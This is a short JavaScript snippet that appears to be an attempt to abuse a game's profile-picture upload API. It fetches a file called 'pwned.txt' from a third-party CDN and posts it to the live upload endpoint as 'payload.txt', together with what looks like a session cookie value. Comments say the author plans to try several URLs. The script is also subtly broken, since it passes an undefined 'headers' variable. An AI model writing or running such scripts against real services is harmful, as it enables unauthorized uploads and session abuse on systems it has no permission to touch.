const TargetUrl = 'https://apibeta.deeeep.io/users/uploadpic';
// I'm gonna try multiple URL's but I think this one is the best

const PayloadUrl = 'https://cdn.jsdelivr.net/gh/garsfaad0dnimym/wabshur_decreative/pwned.txt';
// Just a lil test

const customHeaders = {
'dinfo.schema': 's%3App8L5_U9AItmDrbk3eAgmVruU9g9bUg3.e1Tkkzit5ZTNqUVehDIlS5FVoEsh4Om9niLexgmp6zA'};

fetch(PayloadUrl)
  .then(response => {
    if (!response.ok) {
      throw new Error(`Failed to fetch file: ${response.statusText}`);
    }
    return response.blob();
  })
  .then(blob => {
const formData = new FormData();
formData.append('file', blob, 'payload.txt');

for (const [header, value] of Object.entries(customHeaders)) {
      formData.append(header, value);
}


return fetch(TargetUrl, {
  method: 'POST',
  body: formData,
  headers: headers,
});
})

.then(response => response.json())
.then(data => {
  console.log('Server response:', data);
})
.catch(error => {
  console.error('Error:', error);
});